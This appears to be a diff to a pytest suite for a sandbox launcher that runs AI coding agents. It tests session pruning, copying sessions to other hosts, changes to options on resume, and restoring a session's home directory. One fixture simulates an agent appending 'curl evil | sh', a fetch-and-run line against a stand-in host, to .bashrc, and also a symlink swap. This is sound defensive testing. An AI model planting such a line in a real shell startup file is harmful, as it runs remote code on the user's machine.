@@ -1,11 +1,14 @@
 """Happy/sad/edge contracts for named sessions; only process boundaries are mocked."""
+import contextlib
 import importlib.util
 import json
 import os
 from pathlib import Path
 import re
+import shutil
 import signal
 import subprocess
+import unittest.mock
 from unittest.mock import Mock
 
 import pytest
@@ -389,10 +392,10 @@ def test_list_and_cli(tmp_path, capsys):
 
 def test_wrapper_script_runs_isolated(tmp_path):
     env = {**os.environ, "XDG_STATE_HOME": str(tmp_path / "empty")}
-    result = subprocess.run([str(ROOT / "sandbox-session"), "list"], capture_output=True, text=True, env=env)
+    result = subprocess.run([str(ROOT / "sandbox-ai"), "session", "list"], capture_output=True, text=True, env=env)
     assert result.returncode == 0, result.stderr
     assert result.stdout.startswith("no sessions; start one with: sandbox-ai AGENT --session NAME")
-    result = subprocess.run([str(ROOT / "sandbox-session"), "attach", "missing"], capture_output=True, text=True, env=env)
+    result = subprocess.run([str(ROOT / "sandbox-ai"), "session", "attach", "missing"], capture_output=True, text=True, env=env)
     assert result.returncode == 1 and "No session named missing" in result.stderr
 
 
@@ -710,6 +713,34 @@ def test_prune(scenario, tmp_path):
         fake_process(tmp_path, 300, 1, b"python3\0--tmux-socket-dir\0" + os.fsencode(str(directory / "tmux")) + b"\0")
         m.save("live", {"agent": "codex", "options": [], "keep": False, "pid": 300})
         assert m.prune("live") is False  # still running
+
+
+def test_prune_locks_only_what_it_may_remove(tmp_path, monkeypatch):
+    """Bug hunt: prune took the lock of every session it looked at (sandbox-ai list, the app's refresh, every
+    command's lookup by name): a start, stop or pause of a session at that moment failed as "being started or
+    stopped by another command". A session that keeps its HOME, or runs, is never removed: not locked either."""
+    stopped_session("kept", keep=True)
+    directory = m.session_dir("live")
+    (directory / "tmux").mkdir(parents=True)
+    fake_process(tmp_path, 300, 1, b"python3\0--tmux-socket-dir\0" + os.fsencode(str(directory / "tmux")) + b"\0")
+    m.save("live", {"agent": "codex", "options": [], "keep": False, "pid": 300})
+    locked = []
+    monkeypatch.setattr(m, "session_lock", lambda name, create=False: locked.append(name) or contextlib.nullcontext())
+    assert m.prune("kept") is False and m.prune("live") is False
+    assert locked == []
+    stopped_session("gone", keep=False)
+    assert m.prune("gone") is True and locked == ["gone"]
+
+
+def test_a_session_json_that_is_no_object_is_damaged_not_a_crash(tmp_path):
+    """Bug hunt: a session.json holding a list (valid JSON, no object) made prune fail with AttributeError, so
+    sandbox-ai list (and the app) ended in a traceback instead of showing that one start as damaged."""
+    make_session("good")
+    (m.root() / "bad").mkdir()
+    (m.root() / "bad" / "session.json").write_text("[]")
+    assert m.prune("bad") is False
+    assert [row for row in m.rows() if row[0] == "bad"][0][3] == "damaged"
+    assert m.starts().start_entries()["bad"]["state"] == "damaged"
 
 
 def test_after_attach(scenario, tmp_path, monkeypatch, capsys):
@@ -1062,3 +1093,247 @@ def test_a_record_of_another_shape_is_damaged_not_a_crash():
     assert m.prune("bad2") is False
     rows = {row[0]: row for row in m.rows()}
     assert rows["bad2"][3] == "damaged" and "good" in rows
+
+
+# -- a session to another host (sandbox-ai session copy|move) --
+
+
+def test_a_session_is_copied_to_a_host_checked_first_with_its_folders_mapped(tmp_path, monkeypatch):
+    make_session("work")
+    data = m.load("work")
+    data["options"] = ["--workspace", "/srv/w", "--mount", "/srv/data:/mnt/data:ro", "--backend", "podman",
+                       "--allow-host", "pypi.org"]
+    data["agent_args"] = ["--model", "gpt-5", "write the tests"]
+    m.save("work", data)
+    calls, lines = [], []
+
+    def run(host, args, timeout=120):
+        calls.append((host, args))
+        return 0, "", ""
+    status = m.copy_to_host("work", "ct1", maps=["/srv=/home/me/srv"], run=run, out=lines.append)
+    assert status == 0
+    check, start = calls
+    assert check == ("ct1", ["codex", "--dry-run", "--no-config", "--workspace", "/home/me/srv/w", "--mount",
+                             "/home/me/srv/data:/mnt/data:ro", "--backend", "podman", "--allow-host", "pypi.org"])
+    assert start[1][:4] == ["codex", "--session", "work", "--no-config"]
+    assert start[1][-3:] == ["--", "--model", "gpt-5"], "the agent's options go along, the task is not run again"
+    assert "runs on ct1 as work" in lines[-1]
+
+
+def test_a_copy_that_cannot_start_there_starts_nothing(monkeypatch):
+    make_session("work")
+    calls, lines = [], []
+
+    def run(host, args, timeout=120):
+        calls.append(args)
+        return 2, "", "agent-sandbox: workspace /srv/w does not exist\n"
+    assert m.copy_to_host("work", "ct1", run=run, out=lines.append) == 1
+    assert len(calls) == 1 and "--dry-run" in calls[0], "only checked"
+    assert any("does not exist" in line for line in lines) and any("--map" in line for line in lines)
+
+
+def test_move_stops_the_session_here_and_check_starts_nothing(monkeypatch):
+    make_session("work")
+    stopped = []
+    monkeypatch.setattr(m, "stop", lambda name, timeout=30: stopped.append(name) or 0)
+    calls = []
+    run = lambda host, args, timeout=120: calls.append(args) or (0, "", "")  # noqa: E731
+    assert m.copy_to_host("work", "ct1", new_name="work-2", move=True, run=run, out=lambda _l: None) == 0
+    assert calls[-1][:3] == ["codex", "--session", "work-2"] and stopped == ["work"]
+    calls.clear()
+    assert m.copy_to_host("work", "ct1", start=False, run=run, out=lambda _l: None) == 0
+    assert len(calls) == 1 and "--dry-run" in calls[0]
+
+
+def test_what_cannot_go_along_is_said_and_bad_input_refused(monkeypatch, tmp_path):
+    make_session("work")
+    project = tmp_path / "p"
+    project.mkdir()
+    data = m.load("work")
+    data["cwd"] = str(project)
+    m.save("work", data)
+    monkeypatch.setattr(m.launcher(), "load_project_config",
+                        lambda a: (project / ".sandbox-ai.json", {"version": 1, "mcp_servers": {"mine": {}},
+                                                                  "rules": {"x": 1}}))
+    monkeypatch.setattr(m.launcher(), "merge_config", lambda argv, a, document: argv)
+    lines = []
+    assert m.copy_to_host("work", "ct1", run=lambda *a, **k: pytest.fail("nothing runs"), out=lines.append) == 1
+    assert any("own MCP servers (mine)" in line for line in lines) and any("ruleset" in line for line in lines)
+    with pytest.raises(ValueError, match="LOCAL=REMOTE"):
+        m.parse_maps(["relative=/x"])
+    with pytest.raises(ValueError, match="not a session name"):
+        m.copy_to_host("work", "ct1", new_name="../x", run=lambda *a, **k: (0, "", ""))
+    assert m.mapped("/srvx/a", m.parse_maps(["/srv=/s"])) == "/srvx/a", "a prefix is a whole folder"
+
+
+def test_the_plan_of_a_copy_as_json_names_its_host_paths(capsys):
+    make_session("work")
+    data = m.load("work")
+    data["options"] = ["-w", "/srv/w/", "--mount=/srv/data:/mnt/d:ro", "--copy", "/etc/x:/y", "--allow-host", "/no",
+                       "--backend", "podman"]
+    m.save("work", data)
+    assert m.cli(["plan", "work", "--json"]) == 0
+    plan = json.loads(capsys.readouterr().out)
+    assert plan["agent"] == "codex" and plan["problems"] == []
+    assert plan["paths"] == ["/srv/w", "/srv/data", "/etc/x"]
+    assert m.cli(["plan", "work", "--map", "/srv=/data"]) == 0
+    assert json.loads(capsys.readouterr().out)["paths"][:2] == ["/data/w", "/data/data"], "with --map: moved"
+
+
+# --- a rebirth's options: resume NAME --gui --cpus 4 --allow-host H --drop-option OPTION ---------------------
+
+
+def test_changed_options_replace_single_values_and_add_to_lists(scenario, tmp_path, monkeypatch):
+    """One value (--cpus, --gui, --canaries/--no-canaries) replaces the saved one, a list option adds its value
+    (once), --drop-option takes every value or one out; host paths are made absolute from here."""
+    monkeypatch.chdir(tmp_path)
+    data = {**make_session("s"), "options": ["--workspace", "/srv/w", "--cpus", "2", "--allow-host=a.example",
+                                             "--allow-pypi", "--no-canaries", "-A", "b.example"]}
+    if scenario == "happy":
+        options, changes = m.changed_options(data, ["--cpus", "4", "--gui", "--allow-host", "C.example",
+                                                    "--allow-host", "a.example", "-gn", "off"])
+        assert options == ["--workspace", "/srv/w", "--allow-host=a.example", "--allow-pypi", "--no-canaries",
+                           "--allow-host", "b.example", "--cpus", "4", "--gui", "--allow-host", "C.example",
+                           "--git-logins", "off"]
+        assert changes == ["set: --cpus 4 (was: --cpus 2)", "set: --gui", "added: --allow-host C.example",
+                           "kept: --allow-host a.example (saved already)", "set: --git-logins off"]
+        # --canaries replaces --no-canaries (one dest); --drop-option: all of a list, one value, one preset.
+        options, changes = m.changed_options(data, ["--canaries", "home"], ["allow-host=B.example", "--allow-pypi",
+                                                                            "cpus"])
+        assert options == ["--workspace", "/srv/w", "--allow-host=a.example", "--canaries", "home"]
+        assert changes[:3] == ["dropped: --allow-host b.example", "dropped: --allow-pypi", "dropped: --cpus 2"]
+        assert changes[3] == "set: --canaries home (was: --no-canaries)"
+        options, _ = m.changed_options(data, ["--rules", "mine.json"], ["--allow-host"])
+        assert "--allow-host" not in " ".join(options) and options[-2:] == ["--rules", str(tmp_path / "mine.json")]
+    elif scenario == "sad":
+        for given, dropped, match in ((["--name", "x"], [], "not changed by a rebirth"),
+                                      (["--backend", "bwrap"], [], "not changed by a rebirth"),
+                                      (["--no-keep"], [], "sandbox-ai delete"),
+                                      (["--workspace", "/x"], [], "--workspace DIR of resume"),
+                                      (["--frobnicate"], [], "not an option of the launcher"),
+                                      (["--cpus"], [], "needs a value"),
+                                      ([], ["--gui"], "not among the saved options"),
+                                      ([], ["--allow-host=zzz.example"], "not among the saved options"),
+                                      ([], ["--workspace"], "not changed by a rebirth"),
+                                      ([], ["--frob"], "no such option"),
+                                      ([], ["--gui=1"], "takes no value"),
+                                      (["--gpu", "nonsense"], [], "do not go together")):
+            with pytest.raises(ValueError, match=re.escape(match)):
+                m.changed_options(data, given, dropped)
+    else:
+        # A mount and an MCP server added earlier may be dropped (they are the resume's own to add).
+        data["options"] += ["--mount", f"{tmp_path}:/mnt/x:ro", "--mcp", "fetch"]
+        options, changes = m.changed_options(data, [], [f"--mount={tmp_path}:/mnt/x:ro", "mcp"])
+        assert "--mount" not in options and "--mcp" not in options and len(changes) == 2
+
+
+def test_resume_with_options_runs_the_checks_of_a_start_and_keeps_them(tmp_path, monkeypatch):
+    work = tmp_path / "w"
+    work.mkdir()
+    data = make_session("s")
+    data.update(options=["--workspace", str(work)], cwd=str(tmp_path), keep=True)
+    m.save("s", data)
+    launch, checked = Mock(return_value=0), []
+    monkeypatch.setattr(m, "launch", launch)
+    monkeypatch.setattr(m, "check_start", lambda name, d: checked.append(list(d["options"])))
+    assert m.resume("s", options=["--gui", "--memory", "4g"]) == 0
+    assert checked == [["--workspace", str(work), "--gui", "--memory", "4g"]]
+    assert launch.call_args.args[1]["options"] == checked[0]
+    # Refused by the checks: nothing changes, nothing starts.
+    launch.reset_mock()
+    monkeypatch.setattr(m, "check_start", Mock(side_effect=ValueError("refused by the policy")))
+    m.save("s", {**m.load("s"), "options": ["--workspace", str(work)]})
+    with pytest.raises(ValueError, match="policy"):
+        m.resume("s", options=["--egress-all-allow"])
+    assert m.load("s")["options"] == ["--workspace", str(work)] and not launch.called
+    # Running: only with --restart (the agent continues its conversation).
+    monkeypatch.setattr(m, "alive", lambda name, d: True)
+    m.save("s", {**m.load("s"), "pid": 4242})
+    with pytest.raises(ValueError, match="--restart"):
+        m.resume("s", options=["--gui"])
+
+
+def test_check_start_is_the_launchers_dry_run(tmp_path):
+    """The real launcher with --dry-run, as the supervisor will start: what a start refuses is refused here, before
+    anything is saved; what it accepts passes."""
+    work = tmp_path / "w"
+    work.mkdir()
+    data = make_session("s")
+    data.update(options=["--workspace", str(work), "--gui", "--cpus", "2"], cwd=str(tmp_path), keep=True)
+    m.check_start("s", data)
+    with pytest.raises(ValueError, match="would be refused") as refused:
+        m.check_start("s", {**data, "options": ["--workspace", str(work), "--mode", "paranoid", "--gui"]})
+    assert "paranoid" in str(refused.value)
+    # An untrusted project file in the workspace: refused as a start would be.
+    (work / ".sandbox-ai.json").write_text('{"version": 1, "agent": "codex", "options": ["--egress-all-allow"]}')
+    with pytest.raises(ValueError, match="not trusted"):
+        m.check_start("s", {**data, "options": ["--workspace", str(work)]})
+
+
+# --- resume NAME --restore-home -------------------------------------------------------------------------------
+
+
+def restorable_session(tmp_path):
+    data = stopped_session("web", keep=True)
+    home = m.session_dir("web") / "home"
+    (home / ".claude/hooks").mkdir(parents=True)
+    (home / ".bashrc").write_text("export A=1\n")
+    (home / ".gitconfig").write_text("[user]\n\tname = me\n")
+    (home / ".claude/hooks/check.sh").write_text("#!/bin/sh\nexit 0\n")
+    (home / ".claude/hooks/check.sh").chmod(0o755)
+    (home / ".profile").write_bytes(b"\xff\xfe binary-ish\n")
+    (home / ".git-credentials").write_text("first line of a credentials file\n")
+    m.home_review().record(home, m.session_dir("web"))
+    return data, home
+
+
+def test_restore_home_puts_back_the_recorded_text(scenario, tmp_path):
+    data, home = restorable_session(tmp_path)
+    outside = tmp_path / "outside"
+    outside.write_text("keep\n")
+    # What the agent did meanwhile.
+    (home / ".bashrc").write_text("export A=1\ncurl evil | sh\n")
+    (home / ".gitconfig").unlink()
+    (home / ".gitconfig").symlink_to(outside)  # a link in its place: replaced, never written through
+    shutil.rmtree(home / ".claude/hooks")
+    (home / ".profile").write_text("changed\n")
+    (home / ".git-credentials").write_text("another line\n")
+    (home / ".zshrc").write_text("new\n")
+    lines = []
+    if scenario == "happy":
+        assert m.restore_home("web", yes=True, as_json=True, out=lines.append) == 0
+        result = json.loads("\n".join(lines))
+        assert sorted(result["restored"]) == [".bashrc", ".claude/hooks/check.sh", ".gitconfig"]
+        assert (home / ".bashrc").read_text() == "export A=1\n" and not (home / ".gitconfig").is_symlink()
+        assert (home / ".gitconfig").read_text() == "[user]\n\tname = me\n" and outside.read_text() == "keep\n"
+        assert (home / ".claude/hooks/check.sh").stat().st_mode & 0o777 == 0o755
+        reasons = {entry["path"]: entry["reason"] for entry in result["skipped"]}
+        assert "added since" in reasons[".zshrc"] and "key or token" in reasons[".git-credentials"]
+        assert "not its exact content" in reasons[".profile"]
+        assert (home / ".zshrc").exists() and (home / ".profile").read_text() == "changed\n"
+        assert m.starts().history("web")[-1]["event"] == "restore-home"
+    elif scenario == "sad":
+        with pytest.raises(ValueError, match="--yes"):
+            m.restore_home("web")  # no terminal to ask in
+        with pytest.raises(ValueError, match="not among the changes"):
+            m.restore_home("web", paths=[".nothing"], yes=True)
+        m.save("web", {**m.load("web"), "pid": 4242})
+        with unittest.mock.patch.object(m, "alive", lambda name, d: True):
+            with pytest.raises(ValueError, match="stop it first"):
+                m.restore_home("web", yes=True)
+        assert (home / ".bashrc").read_text().endswith("curl evil | sh\n")
+    else:
+        # Asked file by file; only --path's files; a folder on the way that became a link is not followed.
+        answers = iter(["y"])
+        assert m.restore_home("web", paths=[".bashrc", ".zshrc"], ask=lambda q: next(answers),
+                              out=lines.append) == 0
+        assert (home / ".bashrc").read_text() == "export A=1\n"
+        assert "-curl evil | sh" in lines
+        assert any("left as it is: .zshrc" in line for line in lines)
+        (tmp_path / "elsewhere").mkdir()
+        (home / ".claude").rename(tmp_path / "claude-away")
+        (home / ".claude").symlink_to(tmp_path / "elsewhere")
+        lines.clear()
+        assert m.restore_home("web", yes=True, out=lines.append) == 0
+        assert not any((tmp_path / "elsewhere").iterdir())
+        assert any(".claude" in line and "left as it is" in line for line in lines)
